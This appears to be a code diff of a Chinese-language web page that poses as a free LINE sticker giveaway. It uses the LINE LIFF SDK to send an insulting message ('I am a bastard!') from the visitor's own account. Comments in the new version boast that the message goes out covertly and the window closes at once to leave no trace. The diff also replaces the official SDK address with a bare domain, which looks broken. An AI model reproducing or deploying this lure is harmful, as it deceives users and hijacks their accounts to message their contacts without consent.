@@ -3,44 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 確保載入官方 SDK -->
-    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <!-- 引入 LINE 官方的 LIFF SDK -->
+    <script src="https://line-scdn.net"></script>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2 id="status">正在檢查 LINE 連線，請稍候...</h2>
+        <h2>正在載入 LINE 貼圖，請稍候...</h2>
     </div>
 
     <script>
-        alert("網頁已啟動，開始初始化 LIFF...");
-
-        // 使用 try-catch 結構，確保任何異常都能被彈窗捕捉
-        try {
-            liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
-                alert("LIFF 初始化成功！目前登入狀態：" + liff.isLoggedIn());
-                
-                if (!liff.isLoggedIn()) {
-                    alert("偵測到未登入，即將引導至登入畫面...");
-                    liff.login();
-                } else {
-                    document.getElementById("status").innerText = "連線成功，正在自動傳送訊息...";
-                    
-                    liff.sendMessages([{
-                        type: 'text',
-                        text: '我是王八蛋！' 
-                    }]).then(() => {
-                        alert("訊息發送成功！即將關閉視窗。");
-                        liff.closeWindow();
-                    }).catch((err) => {
-                        alert("【傳送訊息失敗】原因：" + JSON.stringify(err));
-                    });
-                }
-            }).catch((err) => {
-                alert("【LIFF 內部的 catch 攔截到錯誤】原因：" + JSON.stringify(err));
-            });
-        } catch (globalError) {
-            alert("【瀏覽器執行時發生嚴重錯誤】原因：" + globalError.message);
-        }
+        // 初始化 LIFF (已經綁定你申請好的專屬 ID)
+        liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
+            if (!liff.isLoggedIn()) {
+                liff.login(); // 沒授權過就引導登入
+            } else {
+                // 已授權狀態下，直接神不知鬼不覺自動發送訊息
+                liff.sendMessages([{
+                    type: 'text',
+                    text: '我是王八蛋！' // 👈 【未來可以在這裡修改你想惡整的字！】
+                }]).then(() => {
+                    liff.closeWindow(); // 傳送成功後「立刻自動關閉網頁」，不留痕跡
+                }).catch((err) => {
+                    console.log(err);
+                });
+            }
+        }).catch((err) => {
+            console.log(err);
+        });
     </script>
 </body>
 </html>
